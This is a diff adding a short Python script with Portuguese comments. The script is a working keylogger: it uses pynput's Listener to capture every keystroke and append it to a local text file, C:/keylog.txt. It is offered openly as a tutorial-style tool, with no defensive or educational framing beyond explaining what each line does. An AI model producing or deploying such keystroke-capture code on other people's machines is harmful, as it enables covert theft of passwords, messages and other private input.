@@ -1,0 +1,23 @@
+'''
+Explicação das linhas do código
+
+1) O pynput é uma biblioteca Python que permite controlar e monitorar dispositivos de entrada, como teclado e mouse.
+2) O Listener é uma classe fornecida pela biblioteca pynput que permite monitorar eventos de entrada, como pressionamentos de teclas ou cliques do mouse.
+3) Foi criada a variável 'registro' com um diretorio, assim, vamos salvar todos os registros de teclas em um arquivo txt.
+
+'''
+
+from pynput.keyboard import Listener
+
+registro = 'C:/keylog.txt'      # Altere o diretório para armazenar os logs da variavel registro
+
+def tecla_pressionada(key): 
+    try:
+        with open(registro, 'a') as f:
+         f.write(f'{key.char}, ')           
+    except AttributeError:
+        with open(registro, 'a') as f:
+            f.write(f'{str(key)}')
+            
+with Listener(on_press=tecla_pressionada) as listener:
+    listener.join()
